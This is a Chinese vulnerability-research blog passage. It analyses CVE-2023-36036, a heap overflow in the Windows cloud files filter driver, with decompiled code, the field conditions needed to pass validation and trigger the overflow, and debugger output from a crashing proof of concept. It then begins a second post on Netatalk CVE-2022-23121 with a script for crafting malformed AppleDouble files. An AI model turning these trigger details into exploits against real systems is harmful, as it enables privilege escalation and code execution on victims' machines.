Point数据,一般在需要提交/更新数据时会解压。 主要作用就是将压缩后的Reparse Point还原为可读的未压缩数据。 HsmpRpiDecompressBuffer由 HsmpRpReadBuffer调用\n__int64 __fastcall HsmpRpReadBuffer(PFLT_INSTANCE Instance, PFILE_OBJECT FileObject, unsigned __int16 **a3) { ... *a3 = 0i64; v6 = 1024; OutputBuffer = (unsigned __int16 *)ExAllocatePoolWithTag(PagedPool, 0x400ui64, 0x70527348u); v8 = OutputBuffer; ...... } LODWORD(v9) = HsmpRpiDecompressBuffer((__int64)v8, v6, a3); HsmDbgBreakOnStatus((unsigned int)v9); if ( (int)v9 \u0026lt; 0 ) { v16 = WPP_GLOBAL_Control; if ( WPP_GLOBAL_Control == (PDEVICE_OBJECT)\u0026amp;WPP_GLOBAL_Control || (HIDWORD(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026amp; 1) == 0 || BYTE1(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026lt; 2u ) { goto LABEL_8; } v17 = 20i64; goto LABEL_30; } if ( *a3 != v8 ) LABEL_8: ExFreePoolWithTag(v8, 0x70527348u); return (unsigned int)v9; } AI解释\n这段代码实现了解析和解压Reparse Point数据的功能: 1. 分配OutputBuffer内存用于读取Reparse数据。 2. 调用FltFsControlFile读取Reparse数据到OutputBuffer。 3. 如果读取失败,并且错误码表示buffer太小,则重新分配更大的buffer并重试读取。 4. 调用HsmpRpiDecompressBuffer对读取到的数据进行解压。 5. 如果解压成功,返回解压后的数据,否则返回错误码。 6. 释放原始数据内存。 7. 其中包含了详细的错误和日志记录逻辑。 所以总的来说,这段代码用于从文件系统读取Reparse Point数据,然后对数据进行解压和解析,最后返回解析后的数据。 主要功能聚焦在读取压缩数据并解压这块。 HsmpRpReadBuffer由 HsmpRpCommitNoLock和 HsmpSetupContexts调用。\nHsmpRpCommitNoLock解释如下\n这个C函数实现了HsmpRpCommitNoLock,它似乎是用于在没有锁的情况下提交页面重播(Page Replay)数据。 主要的逻辑如下: 1. 校验和准备输入数据 2. 分配内存池来存储提交的数据 3. 构建数据结构,填充各种元数据 4. 尝试压缩数据 5. 将数据写入文件 6. 清理临时数据结构和内存 具体来说,这个函数做了以下工作: 1. 验证输入参数的有效性 2. 为输出缓冲区分配内存 3. 构建输出缓冲区的数据结构 4. 填充输出缓冲区的头部 5. 将输入缓冲区的数据复制到输出缓冲区 6. 计算校验和 7. 尝试压缩输出缓冲区 8. 标记文件属性 9. 将输出缓冲区的数据写入文件 10. 重置文件属性 11. 释放临时缓冲区和内存 所以总的来说,这个函数的主要目的是准备并提交页面重播数据,同时处理必要的校验、压缩和清理工作。 在 HsmpRpCommitNoLock中有如下代码，可以看到在前面diff中出现的0x4000和0x3FFC，可以猜测漏洞产生于该函数中\nLABEL_156: PoolWithTag = (unsigned int *)ExAllocatePoolWithTag(PagedPool, 0x4000ui64, 0x70527348u); v142 = PoolWithTag; v11 = (char *)PoolWithTag; if ( PoolWithTag ) { memset(PoolWithTag, 0, 0x4000ui64); v57 = InputBuffer; v58 = v11 + 4; if ( v8 \u0026amp;\u0026amp; *((_WORD *)v8 + 7) \u0026gt; 0xAu ) v57 = *((_WORD *)v8 + 7); v59 = (unsigned int *)(v58 + 8); *((_WORD *)v58 + 6) = 0; v9 = (unsigned __int64)(v58 + 16); *((_WORD *)v58 + 7) = v57; *((_DWORD *)v58 + 2) = 8 * v57 + 16; *(_DWORD *)v58 = \u0026#39;pReF\u0026#39;; memset(v58 + 16, 0, 8i64 * v57); if ( *((_WORD *)v58 + 7) ) { v60 = *v59; if ( ((v60 + 3) \u0026amp; 0xFFFFFFFFFFFFFFFCui64) + 1 \u0026lt;= 0x3FFC )// 12 偏移 { *v59 = (v60 + 3) \u0026amp; 0xFFFFFFFC; if ( *(_WORD *)v9 ) *((_WORD *)v58 + 6) |= 1u; *(_WORD *)v9 = 7; LODWORD(v9) = 0; *((_WORD *)v58 + 9) = 1; v61 = *v59; *((_DWORD *)v58 + 5) = v61; v58[v61] = 1; 继续审查代码，发现在HsmpRpCommitNoLock中有如下代码，在do while循环中调用memmove函数时，传入的src来源于 HsmpRpReadBuffer解压后的element[10]数据，dst为ExAllocatePoolWithTag分配的大小为0x4000的内存。长度参数来源于ElementInfos[10].Length，不难看出由此可以造成越界写入，且用户可控。\nv32 = 0i64; if ( (v9 \u0026amp; 0x80000000) == 0i64 ) { v8 = (char *)P + 12; ... { if ( (_DWORD)v54 \u0026amp;\u0026amp; (_WORD)v55 ) v167 = \u0026amp;v8[v54]; else v167 = v32; ..... PoolWithTag = (unsigned int *)ExAllocatePoolWithTag(PagedPool, 0x4000ui64, 0x70527348u); v142 = PoolWithTag; v11 = (char *)PoolWithTag; if ( PoolWithTag ) { memset(PoolWithTag, 0, 0x4000ui64); v57 = InputBuffer; v58 = v11 + 4; if ( v8 \u0026amp;\u0026amp; *((_WORD *)v8 + 7) \u0026gt; 0xAu ) v57 = *((_WORD *)v8 + 7); v59 = (unsigned int *)(v58 + 8); *((_WORD *)v58 + 6) = 0; v9 = (unsigned __int64)(v58 + 16); *((_WORD *)v58 + 7) = v57; *((_DWORD *)v58 + 2) = 8 * v57 + 16; *(_DWORD *)v58 = \u0026#39;pReF\u0026#39;; memset(v58 + 16, 0, 8i64 * v57); ..... } *v59 += v109; ..... if ( *((_WORD *)v58 + 28) ) *((_WORD *)v58 + 6) |= 1u; *v59 = (v113 + 3) \u0026amp; 0xFFFFFFFC; .... *v59 += v114; ..... v117 = (char *)v167; v107 = (char *)Src; *v59 = (v118 + 3) \u0026amp; 0xFFFFFFFC; *((_WORD *)v58 + 32) = 17; *((_WORD *)v58 + 33) = v119; v121 = *v59; *((_DWORD *)v58 + 17) = v121; if ( \u0026amp;v58[v121] != v117 ) { memmove(\u0026amp;v58[v121], v117, v120); ...... v125 = 10; do { v126 = v125; *(HSM_ELEMENT_INFO *)\u0026amp;v58[8 * v125 + 16] = v124-\u0026gt;ElementInfos[v125]; memmove(\u0026amp;v58[*v59], (char *)v124 + v124-\u0026gt;ElementInfos[v125].Offset, v124-\u0026gt;ElementInfos[v125].Length); ++v125; *(_DWORD *)\u0026amp;v58[8 * v126 + 20] = *v59; *v59 += *(unsigned __int16 *)\u0026amp;v58[8 * v126 + 18]; } while ( v125 \u0026lt; v124-\u0026gt;NumberOfElements ); ... if ( v14 ) ExFreePoolWithTag(v14, 0x70527348u); if ( v11 ) ExFreePoolWithTag(v11, 0x70527348u); return (unsigned int)v9; } 搜索Reparse point RtlCompressBuffer，找到文章，根据\r文章 _REPARSE_DATA_BUFFER定义如下，可以知道传入 HsmpRpiDecompressBuffer的是 REPARSE_DATA_BUFFER，其中 ReparseTag为IO_REPARSE_TAG_CLOUD_3 值 0x9000301A 并且在结构体 HsmReparseBufferRaw的RawData成员中存储了由 (RtlCompressBuffer压缩的数据 HsmReparseBufferRaw\n// Handled by cldflt.sys!HsmpRpReadBuffer struct { USHORT Flags; // Flags (0x8000 = not compressed) USHORT Length; // Length of the data (uncompressed) BYTE RawData[1]; // To be RtlDecompressBuffer-ed } HsmReparseBufferRaw; _REPARSE_DATA_BUFFER定义\ntypedef struct _REPARSE_DATA_BUFFER { ULONG ReparseTag; // Reparse tag type USHORT ReparseDataLength; // Length of the reparse data USHORT Reserved; // Used internally by NTFS to store remaining length union { // Structure for IO_REPARSE_TAG_SYMLINK // Handled by nt!IoCompleteRequest struct { USHORT SubstituteNameOffset; USHORT SubstituteNameLength; USHORT PrintNameOffset; USHORT PrintNameLength; ULONG Flags; WCHAR PathBuffer[1]; /* Example of distinction between substitute and print names: // mklink /d ldrive c:\\ // SubstituteName: c:\\\\??\\ // PrintName: c:\\ */ } SymbolicLinkReparseBuffer; // Structure for IO_REPARSE_TAG_MOUNT_POINT // Handled by nt!IoCompleteRequest struct { USHORT SubstituteNameOffset; USHORT SubstituteNameLength; USHORT PrintNameOffset; USHORT PrintNameLength; WCHAR PathBuffer[1]; } MountPointReparseBuffer; // Structure for IO_REPARSE_TAG_WIM // Handled by wimmount!FPOpenReparseTarget-\u0026gt;wimserv.dll // (wimsrv!ImageExtract) struct { GUID ImageGuid; // GUID of the mounted VIM image BYTE ImagePathHash[0x14]; // Hash of the path to the file within the // image } WimImageReparseBuffer; // Structure for IO_REPARSE_TAG_WOF // Handled by FSCTL_GET_EXTERNAL_BACKING, FSCTL_SET_EXTERNAL_BACKING in // NTFS (Windows 10+) struct { //-- WOF_EXTERNAL_INFO -------------------- ULONG Wof_Version; // Should be 1 (WOF_CURRENT_VERSION) ULONG Wof_Provider; // Should be 2 (WOF_PROVIDER_FILE) //-- FILE_PROVIDER_EXTERNAL_INFO_V1 -------------------- ULONG FileInfo_Version; // Should be 1 (FILE_PROVIDER_CURRENT_VERSION) ULONG FileInfo_Algorithm; // Usually 0 (FILE_PROVIDER_COMPRESSION_XPRESS4K) } WofReparseBuffer; // Structure for IO_REPARSE_TAG_APPEXECLINK struct { ULONG StringCount; // Number of the strings in the StringList, separated // by \u0026#39;\\0\u0026#39; WCHAR StringList[1]; // Multistring (strings separated by \u0026#39;\\0\u0026#39;, // terminated by \u0026#39;\\0\\0\u0026#39;) } AppExecLinkReparseBuffer; // Structure for IO_REPARSE_TAG_WCI (0x80000018) struct { ULONG Version; // Expected to be 1 by wcifs.sys ULONG Reserved; GUID LookupGuid; // GUID used for lookup in wcifs!WcLookupLayer USHORT WciNameLength; // Length of the WCI subname, in bytes WCHAR WciName[1]; // The WCI subname (not zero terminated) } WcifsReparseBuffer; // Handled by cldflt.sys!HsmpRpReadBuffer struct { USHORT Flags; // Flags (0x8000 = not compressed) USHORT Length; // Length of the data (uncompressed) BYTE RawData[1]; // To be RtlDecompressBuffer-ed } HsmReparseBufferRaw; // Dummy structure struct { UCHAR DataBuffer[1]; } GenericReparseBuffer; } DUMMYUNIONNAME; } REPARSE_DATA_BUFFER, *PREPARSE_DATA_BUFFER; 在\r这个Github仓库中实现了对Reparse point的解析，其中定义了HSM_REPARSE_DATA\ntypedef struct _HSM_ELEMENT_INFO { USHORT Type; // Type of the element (?). One of HSM_ELEMENT_TYPE_XXX USHORT Length; // Length of the element data in bytes ULONG Offset; // Offset of the element data, relative to begin of HSM_DATA. Aligned to 4 bytes } HSM_ELEMENT_INFO, *PHSM_ELEMENT_INFO; typedef struct _HSM_DATA { ULONG Magic; // 0x70527442 (\u0026#39;pRtB\u0026#39;) for bitmap data, 0x70526546 (\u0026#39;FeRp\u0026#39;) for file data ULONG Crc32; // CRC32 of the following data (calculated by RtlComputeCrc32) ULONG Length; // Length of the entire HSM_DATA in bytes USHORT Flags; // HSM_DATA_XXXX USHORT NumberOfElements; // Number of elements HSM_ELEMENT_INFO ElementInfos[1]; // Array of element infos. There is fixed maximal items for bitmap and reparse data } HSM_DATA, *PHSM_DATA; typedef struct _HSM_REPARSE_DATA { USHORT Flags; // Lower 8 bits is revision (must be 1 as of Windows 10 16299) // Flags: 0x8000 = Data needs to be decompressed by RtlCompressBuffer USHORT Length; // Length of the HSM_REPARSE_DATA structure (including \u0026#34;Flags\u0026#34; and \u0026#34;Length\u0026#34;) HSM_DATA FileData; // HSM data } HSM_REPARSE_DATA, *PHSM_REPARSE_DATA; 对应在 REPARSE_DATA_BUFFER的偏移如下\n0:000\u0026gt; dt pa Local var @ 0xa8444fec08 Type _REPARSE_DATA_BUFFER* 0x000001e0`ef867690 +0x000 ReparseTag : 0x9000301a +0x004 ReparseDataLength : 0x4008 +0x006 Reserved : 0 +0x008 SymbolicLinkReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-SymbolicLinkReparseBuffer\u0026gt; +0x008 MountPointReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-MountPointReparseBuffer\u0026gt; +0x008 WimImageReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-WimImageReparseBuffer\u0026gt; +0x008 WofReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-WofReparseBuffer\u0026gt; +0x008 AppExecLinkReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-AppExecLinkReparseBuffer\u0026gt; +0x008 WcifsReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-WcifsReparseBuffer\u0026gt; +0x008 hsm_reparse_data : _HSM_REPARSE_DATA +0x008 GenericReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-GenericReparseBuffer\u0026gt; 0:000\u0026gt; dx -r1 (*((poc3!_HSM_REPARSE_DATA *)0x1e0ef867698)) (*((poc3!_HSM_REPARSE_DATA *)0x1e0ef867698)) [Type: _HSM_REPARSE_DATA] [+0x000] Flags : 0x8001 [Type: unsigned short] // 8 [+0x002] Length : 0x4008 [Type: unsigned short] // 10 [+0x004] FileData [Type: _HSM_DATA] // 12 0:000\u0026gt; dx -r1 (*((poc3!_HSM_DATA *)0x1e0ef86769c)) (*((poc3!_HSM_DATA *)0x1e0ef86769c)) [Type: _HSM_DATA] [+0x000] Magic : 0x70526546 [Type: unsigned long] // 12 [+0x004] Crc32 : 0x31e13b17 [Type: unsigned long] // 16 [+0x008] Length : 0x4004 [Type: unsigned long] // 20 [+0x00c] Flags : 0x2 [Type: unsigned short] // 24 [+0x00e] NumberOfElements : 0xb [Type: unsigned short] // 26 [+0x010] ElementInfos [Type: _HSM_ELEMENT_INFO [10) // 28 PoC构造\n将结构体导入到ida中，在HsmpRpCommitNoLock中首先对ReparseTag进行验证，而后将hsm_reparse_data和对应的长度导入到 HsmpRpValidateBuffer函数中验证。\nif ( (reparse_data_buffer-\u0026gt;ReparseTag \u0026amp; 0xFFFF0FFF) != dword_1C00235D0 ) { LODWORD(v9) = -1073688821; HsmDbgBreakOnStatus(3221278475i64); if ( WPP_GLOBAL_Control != (PDEVICE_OBJECT)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (HIDWORD(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026amp; 1) != 0 \u0026amp;\u0026amp; BYTE1(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026gt;= 2u ) { WPP_SF_qiqDDd( WPP_GLOBAL_Control-\u0026gt;AttachedDevice, 2i64, v30, a2, *(_QWORD *)(v5 + 32), v29, dword_1C00235D0, reparse_data_buffer-\u0026gt;ReparseTag); } goto LABEL_8; } ReparseDataLength = reparse_data_buffer-\u0026gt;ReparseDataLength; v9 = (unsigned int)HsmpRpValidateBuffer(\u0026amp;reparse_data_buffer-\u0026gt;DUMMYUNIONNAME.hsm_reparse_data, ReparseDataLength); 在 HsmpRpValidateBuffer函数中对HSM_DATA结构体的一些字段做了如下校验。\nreparse_data_buffer-\u0026gt;ReparseDataLength \u0026gt; 4 reparse_data_buffer-\u0026gt;hsm_reparse_data.Flags=1 reparse_data_buffer-\u0026gt;hsm_reparse_data.FileData.Magic = \u0026lsquo;pReF\u0026rsquo; reparse_data_buffer-\u0026gt;hsm_reparse_data.FileData.Flags = 2, 并且reparse_data_buffer-\u0026gt;hsm_reparse_data.FileData.Crc32 == RtlComputeCrc32(0, (PUCHAR)\u0026amp;a1-\u0026gt;FileData.Length, v2 - 8 NumberOfElements 不为0，且最大为10，最后一个以NONE结尾 特别的，从如下代码中可以看到对ElementInfos[0]和ElementInfos[1]进行了校验，容易得出如下条件：\nNumberOfElements \u0026gt; 1 FileData.Length \u0026gt;= 0x20 `FileData.ElementInfos[1].Type == 0xA FileData.ElementInfos[1].Offset \u0026gt;= 8 * NumberOfElements + 16 \u0026amp;\u0026amp; FileData.ElementInfos[1].Offset \u0026lt; FileData.Length FileData.ElementInfos[1].Length == 4 FileData.ElementInfos[1].Length + FileData.ElementInfos[1].Offset \u0026lt; 65535 if ( (unsigned __int16)NumberOfElements \u0026gt; 1u \u0026amp;\u0026amp; (unsigned int)Length \u0026gt;= 0x20 \u0026amp;\u0026amp; (v22 = a1-\u0026gt;FileData.ElementInfos[1].Type, v22 \u0026lt; 0x12u) \u0026amp;\u0026amp; ((v23 = a1-\u0026gt;FileData.ElementInfos[1].Offset, !(_DWORD)v23) || v23 \u0026gt;= hsm_data_length) \u0026amp;\u0026amp; (unsigned int)v23 \u0026lt;= (unsigned int)Length \u0026amp;\u0026amp; (v24 = a1-\u0026gt;FileData.ElementInfos[1].Length, v24 \u0026lt;= (unsigned int)Length) \u0026amp;\u0026amp; v24 + (unsigned int)v23 \u0026gt;= (unsigned int)v23 \u0026amp;\u0026amp; v24 + (unsigned int)v23 \u0026lt;= (unsigned int)Length \u0026amp;\u0026amp; v22 == 10 \u0026amp;\u0026amp; v24 == 4 ) { v5 = *(ULONG *)((char *)\u0026amp;p_FileData-\u0026gt;Magic + v23); IsReparseBufferSupported = 0; } else { IsReparseBufferSupported = 0xC0000225; } 如下代码对ElementInfos[2]进行了校验，有如下：\nFileData.ElementInfos[2].Offset \u0026lt; FileData.Length FileData.ElementInfos[2].Length \u0026lt; FileData.Length FileData.ElementInfos[2].Type == 6 if ( (element_1_Data \u0026amp; 0x10) != 0 ) return IsReparseBufferSupported; v27 = a1-\u0026gt;FileData.Length; if ( v27 \u0026lt; 0x18 || (v28 = a1-\u0026gt;FileData.NumberOfElements, (unsigned __int16)v28 \u0026lt;= 2u) || v27 \u0026lt; 0x28 || (v29 = a1-\u0026gt;FileData.ElementInfos[2].Type, v29 \u0026gt;= 0x12u) || (v30 = a1-\u0026gt;FileData.ElementInfos[2].Offset, (_DWORD)v30) \u0026amp;\u0026amp; v30 \u0026lt; 8 * v28 + 16 || (unsigned int)v30 \u0026gt; v27 || (v31 = a1-\u0026gt;FileData.ElementInfos[2].Length, v31 \u0026gt; v27) || v31 + (unsigned int)v30 \u0026lt; (unsigned int)v30 || v31 + (unsigned int)v30 \u0026gt; v27 || v29 != 6 || (IsReparseBufferSupported = 0, v31 != 8) ) { IsReparseBufferSupported = 0xC0000225; } 后面还有一堆校验逻辑就不贴了。\n在 HsmpRpCommitNoLock中对 HsmpRpValidateBuffer返回值做了校验，如果IsReparseBufferSupported不为0则会进入报错逻辑，而在 HsmpRpValidateBuffer\nIsReparseBufferSupported = (unsigned int)HsmpRpValidateBuffer( \u0026amp;reparse_data_buffer-\u0026gt;DUMMYUNIONNAME.hsm_reparse_data, ReparseDataLength); HsmDbgBreakOnStatus(IsReparseBufferSupported); v32 = 0i64; if ( (IsReparseBufferSupported \u0026amp; 0x80000000) == 0i64 ) { ... } else { HsmDbgBreakOnCorruption(); if ( a4 == (_BYTE)v32 ) { if ( WPP_GLOBAL_Control != (PDEVICE_OBJECT)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (HIDWORD(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026amp; 1) != 0 在HsmpRpValidateBuffer中可以看到当通过第一次校验后，如果ElementInfos[1]的Data \u0026amp; 0x10 则会直接返回，此时IsReparseBufferSupported=0能通过校验。\nif ( (unsigned __int16)NumberOfElements \u0026gt; 1u \u0026amp;\u0026amp; (unsigned int)Length \u0026gt;= 0x20 \u0026amp;\u0026amp; (v22 = a1-\u0026gt;FileData.ElementInfos[1].Type, v22 \u0026lt; 0x12u) \u0026amp;\u0026amp; ((v23 = a1-\u0026gt;FileData.ElementInfos[1].Offset, !(_DWORD)v23) || v23 \u0026gt;= hsm_data_length) \u0026amp;\u0026amp; (unsigned int)v23 \u0026lt;= (unsigned int)Length \u0026amp;\u0026amp; (v24 = a1-\u0026gt;FileData.ElementInfos[1].Length, v24 \u0026lt;= (unsigned int)Length) \u0026amp;\u0026amp; v24 + (unsigned int)v23 \u0026gt;= (unsigned int)v23 \u0026amp;\u0026amp; v24 + (unsigned int)v23 \u0026lt;= (unsigned int)Length \u0026amp;\u0026amp; v22 == 10 \u0026amp;\u0026amp; v24 == 4 ) { element_1_Data = *(ULONG *)((char *)\u0026amp;p_FileData-\u0026gt;Magic + v23); IsReparseBufferSupported = 0; } else { IsReparseBufferSupported = 0xC0000225; } HsmDbgBreakOnStatus(IsReparseBufferSupported); if ( (IsReparseBufferSupported \u0026amp; 0x80000000) != 0 ) { v25 = WPP_GLOBAL_Control; if ( WPP_GLOBAL_Control == (PDEVICE_OBJECT)\u0026amp;WPP_GLOBAL_Control || (HIDWORD(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026amp; 1) == 0 || BYTE1(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026lt; 2u ) { return IsReparseBufferSupported; } v26 = 24i64; goto LABEL_163; } if ( (element_1_Data \u0026amp; 0x10) != 0 ) return IsReparseBufferSupported; 通过构造ElementInfos[0]和ElementInfos[1]可以通过HsmpRpValidateBuffer校验，而后漏洞触发点会读取ElementInfos[10]的数据和Length通过memcpy进行拷贝，所以还需要构造ElementInfos[10]的数据，并且ElementInfos[10]的Length需要超过目标缓冲区，特别的在计算CRC32后，需要通过RtlCompressBuffer压缩目标数据，并放入到FileData处。\n构造多大的缓冲区？根据前面补丁分析，在补丁中限制了ReparseDataLength \u0026lt; 0x4000，所以超过四千的部分会造成溢出，如果想溢出8个字节则需要构造0x4008 + 8 = 0x4010，依此类推，在构造缓冲区时。\n如何将构造好的数据传递给驱动并在目标位置触发呢？在网上查到有类似漏洞分析文章\rWindows云文件迷你过滤器驱动程序中的提权漏洞(CVE-2021-31969)，不难看出CVE-2021-31969修复和本次分析的漏洞CVE-2023-36036修复位置类似，都对ReparseDataLength进行了判断，所以本次PoC编写也可以借鉴。\n在CVE-2021-31969分析文章中贴出了部分PoC，结合这部分PoC和前面的结构体，写出PoC也就不难了。\n动态调试\n在如下两个位置下断点\nbp cldflt!HsmpRpCommitNoLock bp cldflt!HsmpRpCommitNoLock+0x13de 运行poc，可以看到已经进入HsmpRpCommitNoLock函数\n1: kd\u0026gt; g Breakpoint 0 hit cldflt!HsmpRpCommitNoLock: fffff804`6f6a1e88 48895c2420 mov qword ptr [rsp+20h],rbx 继续运行，触发第二个断点\n0: kd\u0026gt; g Breakpoint 1 hit cldflt!HsmpRpCommitNoLock+0x13de: fffff804`6f6a3266 e81571faff call cldflt!memcpy (fffff804`6f64a380) 此时memmove已经被优化为memcpy，而要拷贝的长度为0x3f94，dst所在的堆大小为0x4000，dst指向偏移0x74处，最多有0x3f8c大小，所以memcpy拷贝时会越界写入8个字节，造成堆溢出。\n1: kd\u0026gt; rr8 r8=0000000000003f94 1: kd\u0026gt; !pool rcx Pool page ffffd980717f7074 region is Paged pool *ffffd980717f7000 : large page allocation, tag is HsRp, size is 0x4000 bytes Owning component : Unknown (update pooltag.txt) 继续运行，则在memcpy内部触发异常，因为尝试往未分配的内存里面写入00\n0: kd\u0026gt; u cldflt!memcpy+0x165: fffff800`8186a4e5 0f2941f0 movaps xmmword ptr [rcx-10h],xmm0 0: kd\u0026gt; !pool rcx - 0x10 Pool page ffffe5028e4fa000 region is Paged pool ffffe5028e4fa000 is not a valid large pool allocation, checking large session pool... ffffe5028e4fa000 is not valid pool. Checking for freed (or corrupt) pool Address ffffe5028e4fa000 could not be read. It may be a freed, invalid or paged out page 0: kd\u0026gt; rxmm0 mm0=0000000000000000 对应代码为\nif ( v25 ) *(_OWORD *)(v15 + v25 - 16) = *(_OWORD *)(v15 + v25 - 16 + v13); *(__m128 *)(v15 - 0x10) = v14; 以下为调用栈\n1: kd\u0026gt; k # Child-SP RetAddr Call Site 00 fffffb8a`8a45e4f8 fffff804`63717f82 nt!DbgBreakPointWithStatus 01 fffffb8a`8a45e500 fffff804`63717566 nt!KiBugCheckDebugBreak+0x12 02 fffffb8a`8a45e560 fffff804`635fd747 nt!KeBugCheck2+0x946 03 fffffb8a`8a45ec70 fffff804`63638f6f nt!KeBugCheckEx+0x107 04 fffffb8a`8a45ecb0 fffff804`63430730 nt!MiSystemFault+0x1de5ff 05 fffffb8a`8a45edb0 fffff804`6360d1d8 nt!MmAccessFault+0x400 06 fffffb8a`8a45ef50 fffff804`6f64a4e1 nt!KiPageFault+0x358 07 fffffb8a`8a45f0e8 fffff804`6f6a326b cldflt!memcpy+0x161 08 fffffb8a`8a45f0f0 fffff804`6f6a983b cldflt!HsmpRpCommitNoLock+0x13e3 09 fffffb8a`8a45f230 fffff804`6f66f0d7 cldflt!HsmiOpUpdatePlaceholderDirectory+0x57f 0a fffffb8a`8a45f320 fffff804`6f674b65 cldflt!HsmFltProcessUpdatePlaceholder+0x443 0b fffffb8a`8a45f3d0 fffff804`6f6a4504 cldflt!HsmFltProcessHSMControl+0x3d5 0c fffffb8a`8a45f500 fffff804`647264cc cldflt!HsmFltPreFILE_SYSTEM_CONTROL+0x6a4 0d fffffb8a`8a45f5a0 fffff804`64725f7a FLTMGR!FltpPerformPreCallbacksWorker+0x36c 0e fffffb8a`8a45f6c0 fffff804`64725021 FLTMGR!FltpPassThroughInternal+0xca 0f fffffb8a`8a45f710 fffff804`6475ae2f FLTMGR!FltpPassThrough+0x541 10 fffffb8a`8a45f7a0 fffff804`63410665 FLTMGR!FltpFsControl+0xbf 11 fffffb8a`8a45f800 fffff804`6380142c nt!IofCallDriver+0x55 12 fffffb8a`8a45f840 fffff804`63801081 nt!IopSynchronousServiceTail+0x34c 13 fffffb8a`8a45f8e0 fffff804`638d9ed6 nt!IopXxxControlFile+0xc71 14 fffffb8a`8a45fa20 fffff804`63610ef5 nt!NtFsControlFile+0x56 15 fffffb8a`8a45fa90 00007ff9`c648d704 nt!KiSystemServiceCopyEnd+0x25 16 00000056`01aff5b8 00007ff6`5e59167f ntdll!NtFsControlFile+0x14 17 00000056`01aff5c0 00000000`000001bc 0x00007ff6`5e59167f 18 00000056`01aff5c8 00000000`00000000 0x1bc PoC会在过几天上传到GitHub\nhttps://github.com/Chestnuts4/POC 小结 本次漏洞分析离不开业内前辈逆向得出的_HSM_REPARSE_DATA结构体信息，这个结构体微软没有公开的文档，相关资料也很少。可以看到早在2018年，就已经逆向出了HSM相关数据结构信息。目前只有这一个仓库有相关信息，向前辈致敬。\n/*****************************************************************************/ /* ReparseDataHsm.h Copyright (c) Ladislav Zezula 2018 */ /*---------------------------------------------------------------------------*/ /* Interface of the HSM reparse data structures */ /*---------------------------------------------------------------------------*/ /* Date Ver Who Comment */ /* -------- ---- --- ------- */ /* 06.09.18 1.00 Lad The first version of ReparseDataHsm.h */ /*****************************************************************************/ 这里引用一下前辈的主页。\nhttps://www.zezula.net/en/tools/main.html\n整体来看，这个漏洞原理和触发方式较为简单，在使用memcpy之前没有校验长度，而修复也简单，再解压之前验证长度是否超过0x4000，超过则认为数据有错，进入到错误逻辑，从而在源头阻止了触发漏洞逻辑。\n在漏洞修复处在修复上个整数下溢的漏洞时，开发人员只修复当时的整数下溢漏洞，没有去考虑长度会不会过长，某些程度来说这也是开发的粗心大意导致了这个漏洞留到现在。\n在编写PoC参考了其他安全研究员已有的分析。\n至于Exploit部分还得再研究一下。\n参考链接\nhttps://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36036\nhttps://zhuanlan.zhihu.com/p/392194464\nhttps://github.com/microsoft/Windows-classic-samples/tree/main/Samples/CloudMirror\nhttps://learn.microsoft.com/en-us/windows/win32/cfapi/cloud-filter-reference\nhttps://learn.microsoft.com/zh-cn/windows/win32/cfapi/cloud-files-functions\nhttps://learn.microsoft.com/en-us/windows/win32/api/_cloudapi/\nCreated at 2023-11-24T15:49:32+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2022-23121-afp-rce/","title":"CVE-2022-23121 AFP RCE 分析","tags":["漏洞分析"],"description":"","content":"Netatalk介绍 Netatalk 是一个 Apple Filing Protocol (AFP) 的开源实现。它为 Unix 风格系统提供了与 Macintosh 文件共享的功能。多款NAS产品均有集成该功能。\n漏洞简介 Netatalk在处理FPOpenFork命令的时候，由于未检查AppleDouble文件头中的偏移是否超出范围，导致攻击者可以通过控制AppleDouble文件的某些偏移，在内存中进行越界读写，通过该漏洞攻击者可以以启动Netatalk的用户权限执行任意命令\nAppledouble文件 Appledouble文件格式文档可在下面链接下载，AppleDouble文件是mac上一种存储数据的格式，AppleDouble文件可分为文件头和数据部分，文件头格式如下，对于每个Entry来说，数据在文件内的范围可表示为：[offset:offset+length]\nField Length Magic number 4 bytes Version number 4 bytes Filler 16 bytes Number of entries 2 bytes Entry descriptor for each entry: Entry ID 4 bytes Offset 4 bytes Length 4 bytes 以下是一个有效的Appledouble文件，包含两个entry\nentry 1\nentry ID：0x09 offset：0x32 length：0x71 entry 2\nentry ID：0x02 offset：0xA3 length：0x46 https://web.archive.org/web/20180311140826if_/http://kaiser-edv.de/documents/AppleSingle_AppleDouble.pdf\n如何生成有效的AppleDouble文件触发漏洞 在\rhttps://nosec.org/home/detail/4997.html 中keeee师傅分享了如何通过xattr库生成appledouble文件，这里为了方便生成所需文件对keeee师傅的方法进行魔改。\n首先安装 xattr-file和minimist库：\nnpm install xattr-file npm install minimist 在node_modules目录内找到xattr-file.js文件，修改creat方法，为其添加接受各种偏移的接口，大致如下：\nfunction create(attrs, resoLength, findoff, findlen, forkoff, forklen) { ...... var finderInfoOffset = findoff == -1 ? applLength : findoff var finderInfoLength = findlen == -1 ? (attrLength + keysLength + dataLength) : findlen var resourceForkOffset = forkoff == -1 ? fileLength : forkoff var resourceForkLength = forklen == -1 ? resoLength : forklen 生成xattr文件的nodejs脚本：\nvar xattr = require(\u0026#34;xattr-file\u0026#34;); const args = require(\u0026#39;minimist\u0026#39;)(process.argv.slice(2)) const fs = require(\u0026#39;fs\u0026#39;) 